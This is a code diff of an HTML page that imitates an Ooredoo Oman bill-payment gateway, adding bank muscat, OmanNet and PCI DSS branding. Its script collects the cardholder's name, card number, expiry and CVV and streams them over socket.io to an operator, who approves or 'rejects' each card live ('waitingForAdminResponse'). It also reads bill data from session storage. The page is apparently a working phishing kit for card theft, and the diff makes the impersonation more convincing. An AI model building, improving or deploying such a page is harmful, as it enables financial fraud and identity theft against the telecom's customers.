@@ -3,83 +3,156 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>بطاقة الائتمان | Ooredoo</title>
+<title>Payment Gateway</title>
 <style>
-@font-face { font-family: 'Rubik-Regular'; src: url('/ooredoo/fonts/Rubik-Regular.woff2') format('woff2'); }
-@font-face { font-family: 'Rubik-Medium'; src: url('/ooredoo/fonts/Rubik-Medium.woff2') format('woff2'); }
-@font-face { font-family: 'NotoKufiArabic-Regular'; src: url('/ooredoo/fonts/NotoKufiArabic-Regular.woff2') format('woff2'); }
-@font-face { font-family: 'NotoKufiArabic-SemiBold'; src: url('/ooredoo/fonts/NotoKufiArabic-SemiBold.woff2') format('woff2'); }
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; direction: rtl; }
-.card-container { width: 100%; max-width: 420px; margin: 40px auto; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
-.logo-row { display: flex; justify-content: center; margin-bottom: 20px; }
-.logo-row img { height: 36px; }
-h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 20px; color: #080808; margin-bottom: 6px; }
-.subtitle { text-align: center; color: #4c5562; font-size: 14px; margin-bottom: 24px; }
-.form-group { margin-bottom: 18px; }
-.form-group label { display: block; font-size: 14px; color: #333; margin-bottom: 6px; font-weight: 500; }
-.form-group input, .form-group select { width: 100%; height: 48px; border: 1.5px solid #e0e0e0; border-radius: 12px; padding: 0 14px; font-size: 16px; font-family: inherit; outline: none; transition: border-color 0.2s; direction: ltr; text-align: left; }
-.form-group input:focus, .form-group select:focus { border-color: #ed1c24; }
-.form-group input.error { border-color: #ed1c24; }
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #e8e8e8; min-height: 100vh; padding: 20px; }
+.lang-btn { position: fixed; top: 15px; right: 15px; background: #ed1c24; color: #fff; border: none; border-radius: 4px; padding: 6px 16px; font-size: 13px; cursor: pointer; z-index: 100; }
+.container { max-width: 750px; margin: 40px auto; background: #fff; border-radius: 4px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); overflow: hidden; }
+.header { text-align: center; padding: 30px 20px 20px; }
+.ooredoo-logo { font-family: 'Arial', sans-serif; font-size: 48px; font-weight: 700; color: #ed1c24; letter-spacing: -1px; display: inline-block; }
+.order-info { display: flex; justify-content: space-between; padding: 20px 40px; direction: rtl; }
+.order-info .right { text-align: right; }
+.order-info .left { text-align: left; }
+.order-info .label { font-size: 12px; color: #666; margin-bottom: 4px; }
+.order-info .value { font-size: 18px; font-weight: 700; color: #333; }
+.red-line { height: 3px; background: #ed1c24; margin: 0 40px; }
+.payment-section { padding: 30px 40px; }
+.payment-title { text-align: right; font-size: 16px; font-weight: 600; color: #333; margin-bottom: 20px; }
+.payment-methods { display: flex; gap: 0; border: 1px solid #ddd; border-radius: 4px 4px 0 0; overflow: hidden; margin-bottom: 0; }
+.method-tab { flex: 1; padding: 12px 20px; font-size: 14px; color: #666; cursor: pointer; background: #f9f9f9; text-align: center; border-left: 1px solid #ddd; }
+.method-tab:first-child { border-left: none; }
+.method-tab.active { background: #fff; font-weight: 600; color: #333; border-bottom: 3px solid #ed1c24; }
+.card-form-wrapper { border: 1px solid #ddd; border-top: none; padding: 30px; }
+.card-form-inner { display: flex; gap: 24px; }
+.card-form-left { flex: 1; display: flex; flex-direction: column; gap: 16px; }
+.card-preview { width: 180px; height: 110px; background: linear-gradient(135deg, #1a237e, #283593); border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 12px; padding: 10px; flex-direction: column; }
+.card-preview .chip { width: 30px; height: 22px; background: #ffd700; border-radius: 4px; margin-bottom: 8px; }
+.card-preview .card-num-preview { font-size: 11px; letter-spacing: 2px; font-family: monospace; }
+.form-group { display: flex; flex-direction: column; gap: 6px; }
+.form-group label { font-size: 13px; color: #555; text-align: right; font-weight: 500; }
+.form-row { display: flex; gap: 12px; align-items: flex-end; }
+.input-field { border: 1px solid #ccc; border-radius: 4px; padding: 10px 12px; font-size: 15px; width: 100%; direction: ltr; text-align: left; outline: none; transition: border-color 0.2s; }
+.input-field:focus { border-color: #ed1c24; }
+.input-field.error { border-color: #ed1c24; }
+.input-field::placeholder { color: #bbb; }
 .error-msg { color: #ed1c24; font-size: 12px; margin-top: 4px; display: none; }
-.row { display: flex; gap: 12px; }
-.row .form-group { flex: 1; }
-.card-logos { display: flex; align-items: center; gap: 8px; justify-content: center; margin-bottom: 20px; }
-.submit-btn { width: 100%; height: 56px; border-radius: 999px; border: none; background: #ed1c24; color: #fff; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 18px; font-weight: 600; cursor: pointer; box-shadow: 0 8px 20px rgba(237,28,36,0.18); transition: opacity 0.2s; }
-.submit-btn:disabled { background: #ebecef; color: #9da3ae; cursor: not-allowed; box-shadow: none; }
+select.input-field { min-width: 90px; background: #fff; }
+.amount-display { text-align: left; font-size: 22px; font-weight: 700; color: #333; margin-top: 16px; direction: ltr; }
+.buttons { display: flex; gap: 12px; justify-content: flex-start; margin-top: 16px; }
+.btn-cancel { padding: 10px 28px; border: 1px solid #ed1c24; color: #ed1c24; background: #fff; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; }
+.btn-cancel:hover { background: #fff5f5; }
+.btn-pay { padding: 10px 28px; border: none; color: #fff; background: #ed1c24; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; }
+.btn-pay:hover { background: #d4191f; }
+.btn-pay:disabled { background: #ccc; cursor: not-allowed; }
 .waiting-msg { text-align: center; color: #ed1c24; font-size: 14px; margin-top: 12px; display: none; }
-@media (max-width: 500px) {
-  .card-container { margin: 0; border-radius: 0; min-height: 100vh; padding: 24px 16px; }
+.footer { display: flex; align-items: center; justify-content: center; gap: 16px; padding: 20px; border-top: 1px solid #eee; background: #fafafa; flex-wrap: wrap; }
+@media (max-width: 600px) {
+  body { padding: 10px; }
+  .container { margin: 10px auto; }
+  .order-info { flex-direction: column; gap: 12px; text-align: right; padding: 15px 20px; }
+  .order-info .left { text-align: right; }
+  .card-form-inner { flex-direction: column; }
+  .card-preview { width: 100%; height: 80px; }
+  .payment-section { padding: 20px; }
+  .card-form-wrapper { padding: 20px; }
+  .form-row { flex-direction: column; }
+  .red-line { margin: 0 20px; }
+  .buttons { flex-direction: column; }
+  .btn-pay, .btn-cancel { width: 100%; text-align: center; }
 }
 </style>
 </head>
 <body>
-<div class="card-container">
-  <div class="logo-row"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></div>
-  <h1>بيانات البطاقة</h1>
-  <p class="subtitle">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع</p>
-  <div class="card-logos">
-    <span style="color:#1a1f71;font-family:Arial;font-size:15px;font-weight:700;">VISA</span>
-    <span style="position:relative;width:32px;height:20px;display:inline-flex;align-items:center;">
-      <span style="position:absolute;right:2px;width:18px;height:18px;border-radius:50%;background:#eb001b;"></span>
-      <span style="position:absolute;left:2px;width:18px;height:18px;border-radius:50%;background:#f79e1b;opacity:0.95;"></span>
-    </span>
+<button class="lang-btn" onclick="toggleLang()">English</button>
+
+<div class="container">
+  <div class="header">
+    <span class="ooredoo-logo">ooredoo</span>
   </div>
-  <form id="cardForm" autocomplete="off">
-    <div class="form-group">
-      <label>رقم البطاقة</label>
-      <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
-      <div class="error-msg" id="cardNumberError">رقم البطاقة غير صحيح</div>
+
+  <div class="order-info">
+    <div class="right">
+      <div class="label">OOREDOO</div>
+      <div class="value" style="font-size:14px;">رقم الطلب</div>
+      <div class="value" id="orderNumber">-</div>
     </div>
-    <div class="form-group">
-      <label>اسم حامل البطاقة</label>
-      <input type="text" id="cardName" placeholder="الاسم كما هو على البطاقة" style="direction:rtl;text-align:right;">
+    <div class="left">
+      <div class="label">المبلغ المستحق</div>
+      <div class="value" id="amountDisplay">OMR 0.000</div>
     </div>
-    <div class="row">
-      <div class="form-group">
-        <label>الشهر</label>
-        <select id="cardMonth">
-          <option value="">MM</option>
-          <option value="01">01</option><option value="02">02</option><option value="03">03</option>
-          <option value="04">04</option><option value="05">05</option><option value="06">06</option>
-          <option value="07">07</option><option value="08">08</option><option value="09">09</option>
-          <option value="10">10</option><option value="11">11</option><option value="12">12</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label>السنة</label>
-        <select id="cardYear">
-          <option value="">YY</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label>CVV</label>
-        <input type="password" id="cardCVV" placeholder="•••" maxlength="3" inputmode="numeric">
-      </div>
+  </div>
+
+  <div class="red-line"></div>
+
+  <div class="payment-section">
+    <div class="payment-title">اختر طريقة الدفع</div>
+
+    <div class="payment-methods">
+      <div class="method-tab">Samsung Pay</div>
+      <div class="method-tab active">Pay by Card</div>
     </div>
-    <button type="submit" class="submit-btn" id="submitBtn">متابعة الدفع</button>
-    <div class="waiting-msg" id="waitingMsg">جاري التحقق من البطاقة...</div>
-  </form>
+
+    <div class="card-form-wrapper">
+      <form id="cardForm" autocomplete="off">
+        <div class="card-form-inner">
+          <div class="card-preview">
+            <div class="chip"></div>
+            <div class="card-num-preview" id="cardNumPreview">•••• •••• •••• ••••</div>
+          </div>
+          <div class="card-form-left">
+            <div class="form-group">
+              <label>اسم حامل البطاقة</label>
+              <input type="text" class="input-field" id="cardName" placeholder="الاسم كما هو على البطاقة" style="direction:rtl;text-align:right;">
+            </div>
+            <div class="form-group">
+              <label>رقم البطاقة</label>
+              <input type="tel" class="input-field" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+              <div class="error-msg" id="cardNumberError">رقم البطاقة غير صحيح</div>
+            </div>
+            <div class="form-row">
+              <div class="form-group" style="flex:1;">
+                <label>CVV</label>
+                <input type="password" class="input-field" id="cardCVV" placeholder="•••" maxlength="3" inputmode="numeric" style="width:100px;">
+              </div>
+              <div class="form-group" style="flex:1.5;">
+                <label>تاريخ الانتهاء</label>
+                <div class="form-row" style="gap:8px;">
+                  <select class="input-field" id="cardMonth">
+                    <option value="">MM</option>
+                    <option value="01">01</option><option value="02">02</option><option value="03">03</option>
+                    <option value="04">04</option><option value="05">05</option><option value="06">06</option>
+                    <option value="07">07</option><option value="08">08</option><option value="09">09</option>
+                    <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+                  </select>
+                  <select class="input-field" id="cardYear">
+                    <option value="">YY</option>
+                  </select>
+                </div>
+              </div>
+            </div>
+
+            <div class="amount-display">OMR <span id="formAmount">0.000</span></div>
+
+            <div class="buttons">
+              <button type="submit" class="btn-pay" id="submitBtn">الدفع</button>
+              <button type="button" class="btn-cancel" onclick="handleCancel()">إلغاء</button>
+            </div>
+            <div class="waiting-msg" id="waitingMsg">جاري التحقق من البطاقة...</div>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="footer">
+    <span style="font-weight:700;font-size:13px;color:#1a237e;">pci<span style="color:#f44336;">DSS</span></span>
+    <span style="font-size:10px;color:#666;text-align:center;">Powered by<br><strong>بنك مسقط</strong><br>bank muscat</span>
+    <span style="font-size:12px;color:#00695c;font-weight:600;">عُمانـات<br>OmanNet</span>
+    <span style="font-size:18px;font-weight:800;color:#1a237e;font-style:italic;">VISA</span>
+    <span style="font-size:14px;font-weight:700;color:#eb001b;">Master<span style="color:#f79e1b;">Card</span></span>
+    <span style="font-size:13px;font-weight:700;color:#6c3fa0;">مـال Maal</span>
+  </div>
 </div>
 
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
@@ -99,10 +172,23 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
     yearSelect.appendChild(opt);
   }
 
-  // Get params
+  // Get params from URL or sessionStorage
   var params = new URLSearchParams(window.location.search);
   var service = params.get('service') || '';
   var amount = params.get('amount') || '0';
+
+  // Also try sessionStorage
+  var billData = null;
+  try { billData = JSON.parse(sessionStorage.getItem('last_ooredoo_bill_lookup') || 'null'); } catch(e) {}
+  if (billData) {
+    if (!service) service = billData.number || billData.customerNumber || '';
+    if (amount === '0') amount = billData.amount || '0';
+  }
+
+  var amountFormatted = parseFloat(amount).toFixed(3);
+  document.getElementById('orderNumber').textContent = service || '-';
+  document.getElementById('amountDisplay').textContent = 'OMR ' + amountFormatted;
+  document.getElementById('formAmount').textContent = amountFormatted;
 
   // Format card number
   var cardInput = document.getElementById('cardNumber');
@@ -110,9 +196,12 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
     var val = this.value.replace(/\D/g, '').slice(0, 16);
     var formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
     this.value = formatted;
+    // Update preview
+    var preview = val.replace(/(.{4})/g, '$1 ').trim();
+    document.getElementById('cardNumPreview').textContent = preview || '•••• •••• •••• ••••';
   });
 
-  // Socket
+  // Socket events
   socket.on('connect', function() {
     if (visitorId) socket.emit('visitor:reconnect', visitorId);
     socket.emit('visitor:pageEnter', 'بطاقة الائتمان');
@@ -135,7 +224,7 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
       document.getElementById('waitingMsg').textContent = 'تم رفض البطاقة. يرجى المحاولة ببطاقة أخرى.';
       document.getElementById('waitingMsg').style.display = 'block';
       document.getElementById('submitBtn').disabled = false;
-      document.getElementById('submitBtn').textContent = 'متابعة الدفع';
+      document.getElementById('submitBtn').textContent = 'الدفع';
     }
   });
 
@@ -174,7 +263,7 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
     return 'Unknown';
   }
 
-  // Submit
+  // Submit form
   document.getElementById('cardForm').addEventListener('submit', function(e) {
     e.preventDefault();
     var cardNum = cardInput.value.replace(/\s/g, '');
@@ -236,6 +325,21 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
       waitingForAdminResponse: true
     });
   });
+
+  // Cancel
+  window.handleCancel = function() {
+    window.history.back();
+  };
+
+  // Language toggle
+  window.toggleLang = function() {
+    var btn = document.querySelector('.lang-btn');
+    if (btn.textContent === 'English') {
+      btn.textContent = 'عربي';
+    } else {
+      btn.textContent = 'English';
+    }
+  };
 })();
 </script>
 </body>
